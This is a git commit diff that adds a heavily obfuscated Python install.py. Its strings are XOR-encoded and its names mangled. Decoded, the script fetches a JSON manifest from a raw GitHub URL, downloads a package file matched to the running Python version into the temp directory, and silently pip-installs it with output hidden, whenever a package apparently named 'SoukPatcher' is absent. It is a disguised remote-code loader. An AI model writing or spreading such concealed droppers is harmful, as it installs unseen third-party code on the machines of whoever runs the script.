978e98da0876a5b5e2f84b69950c99cdff539639
rajveerexe <motaop904@gmail.com>
2025-11-25 23:25:55 +0530

    Create install.py

---
+++ install.py
@@ -0,0 +1,46 @@
+_B=''
+_A=chr
+
+IlIIlIIlIllII = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(18, [112, 103, 123, 126, 102, 123, 124, 97])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(247, [178, 143, 148, 146, 135, 131, 158, 152, 153]))
+IIllllIllIIIlIIII = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(214, [180, 163, 191, 186, 162, 191, 184, 165])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(42, [69, 90, 79, 68]))
+lIlllIIIIllIIllllIl = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(92, [62, 41, 53, 48, 40, 53, 50, 47])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(74, [58, 56, 35, 36, 62]))
+llIIIlIIIllIIIIlIIl = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(187, [217, 206, 210, 215, 207, 210, 213, 200])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(101, [22, 17, 23]))
+lllllIIIlllIIIIIII = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(187, [212, 200]))
+IlllllIllIlIIlIIl = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(133, [246, 252, 246]))
+llllIllIlIIlllll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(25, [115, 106, 118, 119]))
+IlllllllIIllllII = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(254, [138, 155, 147, 142, 152, 151, 146, 155]))
+lIlllllllllll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(127, [12, 10, 29, 15, 13, 16, 28, 26, 12, 12]))
+IlIIIlIIlIIIIIlllIIll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(75, [57, 46, 58, 62, 46, 56, 63, 56]))
+IIlllllllIIllII = (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(50, [73, 79, 28, 73, 79]).format(IlllllIllIlIIlIIl.version_info.major, IlllllIllIlIIlIIl.version_info.minor)
+IllIlllIlIIIIlIIl = (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(10, [98, 126, 126, 122, 121, 48, 37, 37, 120, 107, 125, 36, 109, 99, 126, 98, 127, 104, 127, 121, 111, 120, 105, 101, 100, 126, 111, 100, 126, 36, 105, 101, 103, 37, 120, 107, 96, 124, 111, 111, 120, 111, 114, 111, 37, 89, 101, 127, 97, 90, 107, 126, 105, 98, 111, 120, 37, 120, 111, 108, 121, 37, 98, 111, 107, 110, 121, 37, 103, 107, 99, 100, 37, 108, 99, 102, 111, 121, 36, 96, 121, 101, 100])
+
+def llIlIIIIllIIIlllIll(name: llIIIlIIIllIIIIlIIl):
+    (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(86, [21, 62, 51, 53, 61, 118, 59, 57, 50, 35, 58, 51, 118, 51, 46, 63, 37, 34, 51, 56, 53, 51, 118, 33, 63, 34, 62, 57, 35, 34, 118, 63, 59, 38, 57, 36, 34, 63, 56, 49, 120])
+    try:
+        lIIlIIIIllIIllIlIlIlll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(206, [167, 163, 190, 161, 188, 186, 162, 167, 172, 224, 187, 186, 167, 162]))
+        return lIIlIIIIllIIllIlIlIlll.util.find_spec(name) is not None
+    except IlIIlIIlIllII:
+        return False
+
+def lIIllIIlIIlIIIIIIIIlIl(cmd):
+    (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(191, [237, 202, 209, 159, 204, 202, 221, 207, 205, 208, 220, 218, 204, 204, 159, 200, 214, 203, 215, 208, 202, 203, 159, 207, 205, 214, 209, 203, 214, 209, 216, 159, 222, 209, 198, 203, 215, 214, 209, 216, 145])
+    with IIllllIllIIIlIIII(lllllIIIlllIIIIIII.devnull, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(165, [210, 199])) as lIlIlIlIlIIIII:
+        return lIlllllllllll.run(cmd, stdout=lIlIlIlIlIIIII, stderr=lIlIlIlIlIIIII)
+
+def IlIIllIIIlIIlIlIIlIll():
+    try:
+        lIIlIIlIIIlIIIIlIIIlIl = IlIIIlIIlIIIIIlllIIll.get(IllIlllIlIIIIlIIl).json()
+        IIllIllIllIIIIIlllIl = lIIlIIlIIIlIIIIlIIIlIl.get(IIlllllllIIllII)
+        if not IIllIllIllIIIIIlllIl:
+            lIlllIIIIllIIllllIl((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(248, [163, 217, 165, 216, 182, 151, 216, 154, 141, 145, 148, 156, 216, 158, 151, 138, 216, 168, 129, 140, 144, 151, 150]), IIlllllllIIllII)
+            return
+        llIlllIllIIllllI = IlllllllIIllllII.gettempdir()
+        llIllIllIIIlIIIllllIl = lllllIIIlllIIIIIII.path.join(llIlllIllIIllllI, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(28, [111, 115, 105, 119, 108, 125, 104, 127, 116, 49, 45, 50, 44, 50, 44, 49, 108, 101, 47, 49, 114, 115, 114, 121, 49, 125, 114, 101, 50, 107, 116, 112]))
+        lIIIlIIlIlllII = IlIIIlIIlIIIIIlllIIll.get(IIllIllIllIIIIIlllIl).content
+        with IIllllIllIIIlIIII(llIllIllIIIlIIIllllIl, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(43, [92, 73])) as IlIIIIlIllIIlIIIl:
+            IlIIIIlIllIIlIIIl.write(lIIIlIIlIlllII)
+        lIIllIIlIIlIIIIIIIIlIl([IlllllIllIlIIlIIl.executable, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(201, [228, 164]), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(195, [179, 170, 179]), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(122, [19, 20, 9, 14, 27, 22, 22]), llIllIllIIIlIIIllllIl])
+    except IlIIlIIlIllII as IlIIIlllllIIIlII:
+        lIlllIIIIllIIllllIl((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(65, [26, 96, 28, 97, 4, 51, 51, 46, 51, 123]), IlIIIlllllIIIlII)
+if not llIlIIIIllIIIlllIll((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(6, [85, 105, 115, 109, 86, 103, 114, 101, 110])):
+    IlIIllIIIlIIlIlIIlIll()
